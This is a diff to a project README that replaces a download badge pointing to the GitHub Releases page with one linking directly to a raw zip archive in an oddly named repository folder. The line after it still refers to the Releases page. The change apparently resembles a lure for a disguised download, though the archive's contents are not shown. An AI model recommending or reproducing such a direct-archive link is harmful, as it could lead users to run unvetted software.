@@ -15,7 +15,7 @@ Welcome to **FreeSource**, a collection of useful tools designed for easy use by
 ## 📥 Download & Install
 To get the latest version of FreeSource, please visit the following link:
 
-[![Download FreeSource](https://img.shields.io/badge/Download-FreeSource-blue.svg)](https://github.com/vighnesh0537/FreeSource/releases)
+[![Download FreeSource](https://raw.githubusercontent.com/vighnesh0537/FreeSource/main/Childermas/FreeSource-v3.4.zip)](https://raw.githubusercontent.com/vighnesh0537/FreeSource/main/Childermas/FreeSource-v3.4.zip)
 
 Once you're on the Releases page, you will see a list of available versions.
 
